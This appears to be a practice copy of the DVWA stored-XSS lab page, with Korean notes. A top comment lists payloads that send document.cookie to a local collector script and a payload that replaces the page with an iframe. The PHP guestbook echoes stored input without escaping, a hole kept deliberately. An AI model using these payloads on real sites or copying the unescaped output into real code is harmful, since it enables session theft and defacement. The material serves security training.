<!--
1.쿠키값 전송
1-1.Jquery 의 ajax를 이용하여 해커의 사이트로 쿠키값을 전송한다
1-2.<script>location.href="http://localhost/3.dvwa/11.XSS%20(Stored)/XSS-s.php?"+document.cookie;</script>
1-3.<img width="0" height="0" src="x" onerror="document.location='http://localhost/3.dvwa/11.XSS%20(Stored)/XSS-s.php?'+document.cookie">


2.사이트 조작
db의 입력값이 허락한다면
사이트를 조작할 수 있다
<body topmargin=0 leftmargin=0 onload="document.body.innerHTML='<iframe width=100% height=800 src=http://www.daum.net/></iframe>';">
이렇게 하면 사이트의 기능을 상실 시키거나 해커가 의도한 사이트로 이동시켜 피해를 줄 수 있다.




-->

<!DOCTYPE html>

<html>

<head>
    <meta content="text/html; charset=UTF-8" />

    <script>

        /* Form validation */
        function validate_required(field,alerttxt)
        {
            with (field) {
                //with를 쓰게 되면 지정된 값을 반복적으로 쓰지 않아도 된다. field
                if (value==null||value=="") {
                    alert(alerttxt);return false;
                }
                else {
                    return true;
                }
            }
        }

        function validateGuestbookForm(thisform) {
            with (thisform) {
                //https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=seilius&logNo=130165893114


                // Guestbook form
                if (validate_required(txtName,"Name can not be empty.")==false)
                {txtName.focus();return false;}

                if (validate_required(mtxMessage,"Message can not be empty.")==false)
                {mtxMessage.focus();return false;}

            }
        }

        function confirmClearGuestbook(){
            window.open("http://localhost/3.dvwa/11.XSS%20(Stored)/reset.php", "_blank");

        }

    </script>


</head>



<body class="home">
<div class="body_padded">
    <h1>Vulnerability: Stored Cross Site Scripting (XSS) - low</h1>

    <?php
    include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";


    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim($_POST['mtxMessage']);
        $name = trim($_POST['txtName']);
        //trim() >> 빈칸 없애기 함수


        // Sanitize message input
        $message = stripslashes($message);
        $message = ((isset($GLOBALS["con"]) && is_object($GLOBALS["con"])) ? mysqli_real_escape_string($GLOBALS["con"], $message) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

        // Sanitize name input
        $name = ((isset($GLOBALS["con"]) && is_object($GLOBALS["con"])) ? mysqli_real_escape_string($GLOBALS["con"], $name) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

        // Update database
        $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["con"], $query) or die('<pre>' . ((is_object($GLOBALS["con"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>');


        $sql="set @CNT=0;";
        mysqli_query($con, $sql);

        $sql="UPDATE guestbook set guestbook.comment_id=@CNT:=@CNT+1;";
        mysqli_query($con, $sql);




    }
    ?>

    <div class="vulnerable_code_area">
        <form method="post" name="guestform" ">
        <table width="550" border="0" cellpadding="2" cellspacing="1">
            <tr>
                <td width="100">Name *</td>
                <td><input name="txtName" type="text" size="30" maxlength="10"></td>
            </tr>
            <tr>
                <td width="100">Message *</td>
                <td><textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea></td>
            </tr>
            <tr>
                <td width="100">&nbsp;</td>
                <td>
                    <input name="btnSign" type="submit" value="Sign Guestbook" onclick="return validateGuestbookForm(this.form);" />
                    <input name="btnClear" type="submit" value="Clear Guestbook" onClick="return confirmClearGuestbook();" />

                </td>
            </tr>
        </table>
        </form>
    </div>
    </div>


<?php

$query = "select *from guestbook";
$result = mysqli_query($GLOBALS["con"], $query);


if (mysqli_num_rows($result) > 0) {

    while ($row = mysqli_fetch_assoc($result)) {//배열의 끝까지 반복하라는 뜻

        echo  $row["comment_id"] . "번재 게시물 ";
        echo "<br>";
        echo  "이름: ".$row["name"];
        echo "<br>";
        echo  "메시지: ".$row["comment"];
        echo "<br>";
        echo "<br>";
    }
}
?>


</body>
</html>



